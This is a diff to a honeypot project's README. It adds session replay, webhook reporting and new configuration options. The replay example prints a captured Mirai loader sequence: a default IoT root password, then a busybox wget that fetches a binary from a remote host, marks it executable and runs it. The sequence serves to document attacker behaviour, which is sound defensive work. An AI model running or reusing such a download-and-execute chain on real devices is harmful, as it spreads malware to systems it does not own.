@@ -152,6 +152,65 @@ shows the full breakdown for every attacker — see [docs/detection_rules.md](do
 
 ---
 
+## Session replay
+
+A table of events tells you *what* was tried. Replaying a session in order shows
+*how* the operator worked — where they hesitated, what they reached for after a
+failure, the order they enumerated things in. The **Sessions** page lists every
+connection and defaults to **interactive only** (`commands_run > 0`), which is
+the filter that matters: a busy sensor logs thousands of drive-by connects and a
+handful of sessions where somebody actually typed.
+
+Playback uses the real inter-event timing, clamped to 140–2200ms per step so a
+two-minute idle doesn't stall the player. Any gap the clamp swallowed is drawn
+as an explicit `⋯ 1m 32s idle` marker — the viewer is never quietly misled about
+the pace. Play/pause, 1–8× speed, a scrubber, and keyboard control (space, ← →).
+
+A captured Mirai loader, as it replays:
+
+```
++  0.0s  auth_attempt   root:xmhdipc
++  1.0s  auth_success   root
++  1.3s  command        /bin/busybox ECCHI
++  1.2s  command        /bin/busybox wget http://198.51.100.77/bins/mirai.arm7 -O /tmp/x
++  1.0s  command        chmod +x /tmp/x
++  1.5s  command        /tmp/x
+```
+
+Backed by `GET /api/sessions` (filter by service, source, window, commands; five
+sort fields) and `GET /api/sessions/{id}` for the full transcript.
+
+---
+
+## Reporting
+
+Two channels, answering different questions:
+
+- **Real-time alerts** — "something just happened." A new alert at or above
+  `ALERT_MIN_SEVERITY` is pushed to a webhook, rate-capped per detection run.
+- **Daily digest** — "what happened yesterday." One summary a day: volume, top
+  sources, credentials, alerts, and any second-stage URLs.
+
+```bash
+make digest-preview                          # print the payload, send nothing
+python -m pipeline.reporting.digest          # send it
+```
+
+Discord gets a rich embed; Slack and Teams get markdown; anything else gets
+structured JSON — auto-detected from the webhook URL. Two deliberate choices:
+
+- **Captured payload URLs are defanged** (`hxxp://evil[.]com`). Chat clients
+  unfurl links and people click them; posting a live malware-distribution URL
+  into a channel turns an observation into an incident.
+- **A zero-event day is never painted healthy.** It is reported explicitly,
+  because a sensor that sees nothing for a day is usually a sensor that has
+  fallen over.
+
+Exit codes: `0` sent, `1` delivery failed, `2` no webhook configured — so a
+silent cron failure is visible.
+
+---
+
 ## Configuration
 
 Everything is environment-variable driven; copy [`.env.example`](.env.example)
@@ -163,8 +222,11 @@ and edit. Highlights:
 | `HONEYPOT_PERSONA` | `ubuntu-generic` | host identity (`centos-legacy`, `iot-router`, `windows-iis`) |
 | `ACCEPT_LOGIN_RATE` | `0.15` | fraction of logins to "accept" so post-auth behaviour can be observed |
 | `SSH_PORT` … `HTTP_PORT` | 2222/2323/2121/8081 | bind ports |
+| `REDIS_PORT` / `MYSQL_PORT` | 6379 / 3306 | datastore bait — real ports, no remap needed |
 | `API_REDACT_PASSWORDS` | off | blank captured passwords in API responses |
 | `API_CORS_ORIGINS` | localhost:5173 | dashboard origin(s) |
+| `ALERT_WEBHOOK_URL` | unset | real-time alerts (Slack/Discord/Teams/generic) |
+| `DIGEST_WEBHOOK_URL` | falls back to `ALERT_WEBHOOK_URL` | daily digest destination |
 
 ### Deployment safety
 
